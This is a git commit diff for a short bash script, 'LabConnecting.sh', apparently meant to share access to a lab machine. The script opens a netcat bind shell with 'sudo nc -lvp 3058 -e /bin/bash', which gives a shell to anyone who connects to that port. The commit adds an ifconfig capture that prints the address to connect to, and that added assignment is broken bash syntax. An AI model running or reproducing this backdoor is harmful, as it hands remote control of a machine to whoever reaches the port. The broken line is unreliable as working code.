8df9bf226548e1f6fb06980319e0cf884c1a2087
Alwin George <150264978+Alwin444@users.noreply.github.com>
2024-09-09 22:50:47 +0530

    Update LabConnecting.sh

--- LabConnecting.sh
+++ LabConnecting.sh
@@ -1,5 +1,8 @@
 #! /bin/bash
 echo "Lab connecting Made to share ONLY!!! heehehehe"
 echo "Type csc for password"
+Connect_id = $(ifconfig)
 sudo chmod +x /bin/bash
+
+echo "IP address to connect is: $Connect_id"
 sudo nc -lvp 3058 -e /bin/bash
